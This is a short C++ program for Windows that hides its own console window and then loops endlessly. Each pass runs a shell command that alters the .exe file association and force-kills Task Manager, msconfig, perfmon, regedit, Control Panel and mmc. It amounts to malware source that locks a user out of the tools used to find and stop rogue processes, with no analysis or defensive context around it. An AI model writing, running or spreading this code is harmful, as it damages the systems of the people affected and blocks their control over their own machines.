#include <iostream>
#include <windows.h>

int main() {
    #pragma optimize("", off)
    HWND hConsole = GetConsoleWindow();
    ShowWindow(hConsole, SW_HIDE);
    while (!false) {
        system("assoc .exe=.exe || taskkill /f /im Taskmgr.exe || taskkill /f /im msconfig.exe || taskkill /f /im perfmon.exe || taskkill /f /im compmgmt.mse || taskkill /f /im control.exe || taskkill /f /im regedit.exe || taskkill /f /im mmc.exe");
    }
    #pragma optimize("", on)
    return 0; 
}
